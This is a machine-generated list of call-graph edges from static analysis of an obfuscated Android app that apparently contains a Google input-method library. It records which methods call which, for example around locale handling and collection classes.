VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>($r1) in <kwe: miy x(java.lang.Object)> ==> <miv: void <init>(java.lang.Object)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("ar-XT", "bgp-XC", "bgp-XT", "bgq-PK", "bgq-XU", "bm-XF", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void u(int,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: virtualinvoke r0.<ljf: void i(int)>(3) in <ljf: void <init>()> ==> <ljf: void i(int)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r7, $i3, $r1, $i1, $i2) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)> ==> <lma: void <init>()>
SPECIAL edge: specialinvoke $r3.<ivw: void <init>(ivv,java.lang.String)>(r0, $r2) in <ivv: ivw i(java.lang.String)> ==> <ivw: void <init>(ivv,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i7, $i5) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.String: void <init>()>() in <lsn: void <clinit>()> ==> <java.lang.String: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Parameter specified as non-null is null: method ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r0, 1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int a(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lqr: boolean m()>
VIRTUAL edge: virtualinvoke r0.<ljf: void j(int,java.lang.Object,int,int)>($i0, $r1, $i3, $i5) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void j(int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "the total number of elements must fit in an int") in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <iye: void y(boolean,java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
CLINIT edge: staticinvoke <ltf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltf: void <clinit>()>
CLINIT edge: staticinvoke <bel: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <bel: void <clinit>()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: $r4 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r4.<java.lang.Throwable: void <init>()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <lmo: lqs G(java.util.Comparator)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int c()>
CLINIT edge: staticinvoke <lqr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqr: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lrg: int hashCode()>
CLINIT edge: staticinvoke <ose: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ose: void <clinit>()>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(4) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lsn: void <init>(java.util.logging.Level)>($r1) in <lsd: void <init>(java.util.logging.Level)> ==> <lsn: void <init>(java.util.logging.Level)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lwc: void <init>()>() in <lwe: void <init>()> ==> <lwc: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqp: java.lang.Object get(int)> ==> <iye: void O(int,int)>
STATIC edge: $r11 = staticinvoke <lma: lma p(java.util.Collection)>($r10) in <lmb: lme f()> ==> <lma: lma p(java.util.Collection)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lrg: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r5) in <ljf: boolean add(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>($i1, $i0) in <lkm: void <init>(lkq,int)> ==> <lsb: void <init>(int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma f()>() in <lkx: lma p()> ==> <lqq: lma f()>
INTERFACE edge: $z1 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: boolean hasNext()>
STATIC edge: $i5 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
VIRTUAL edge: virtualinvoke $r2.<j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>($r0, $l0, $r1) in <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>
STATIC edge: $i7 = staticinvoke <izw: int aj(java.lang.Object,int)>($r5, $i6) in <ljf: boolean add(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i0, $i1) in <lly: lma g()> ==> <lma: boolean x(int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int rotateLeft(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void u(int,java.lang.Object)>($i0, $r2) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: void u(int,java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void p()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("EntryStoreHelper") in <hnc: void <clinit>()> ==> <lth: lth i(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
STATIC edge: $r1 = staticinvoke <luk: lum a(java.lang.String[])>($r0) in <luk: void <clinit>()> ==> <luk: lum a(java.lang.String[])>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljd: int b()> ==> <iye: void I(boolean,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
STATIC edge: $r2 = staticinvoke <lvm: lum j()>() in <luk: lum a(java.lang.String[])> ==> <lvm: lum j()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljf: int o(int,int,int,int)> ==> <izw: int af(int,int)>
STATIC edge: $r4 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r1) in <hcb: void <init>()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int c()>() in <lje: void <init>(ljf)> ==> <ljf: int c()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: java.util.Iterator iterator()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int numberOfLeadingZeros(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lqr: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqr: lsa l()>() in <lqr: java.util.Iterator iterator()> ==> <lqr: lsa l()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: $i0 = staticinvoke <izw: int af(int,int)>($i0, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i1) in <ljf: int b()> ==> <ljf: void q(int)>
SPECIAL edge: specialinvoke $r23.<jhe: void <init>(lak,lsr,int,byte[])>($r10, $r1, 20, null) in <lsd: boolean b(lsr)> ==> <jhe: void <init>(lak,lsr,int,byte[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void set(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void set(long)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r3, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.NullPointerException: void <init>(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int d(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: java.lang.Object next()>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lql: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r0, 0, $r0, 0, 0) in <lqr: void <clinit>()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lvr: boolean equals(java.lang.Object)>($r4) in <lvt: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void f(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void f(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Throwable: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>(0) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int getAndSet(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i2) in <ljd: int f(java.lang.Object)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r6.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i0, $r1, $i1, $i2) in <lly: lma g()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: int size()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
SPECIAL edge: specialinvoke $r0.<lak: void <init>(byte[])>(null) in <lsu: void <clinit>()> ==> <lak: void <init>(byte[])>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ing: void <init>(java.lang.String,iec)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r11 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r7, $r8) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: java.lang.Object al(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("] was already created.") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Multiple entries with same key: ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lmb: void <init>()>() in <lme: lmb g()> ==> <lmb: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnp: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
CLINIT edge: staticinvoke <ltc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltc: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
CLINIT edge: staticinvoke <gwk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gwk: void <clinit>()>
SPECIAL edge: specialinvoke $r6.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_TRENDING_METADATA", 6, 6) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<lvs: void <init>(java.lang.String,int)>("LONG", 2) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getValue()>
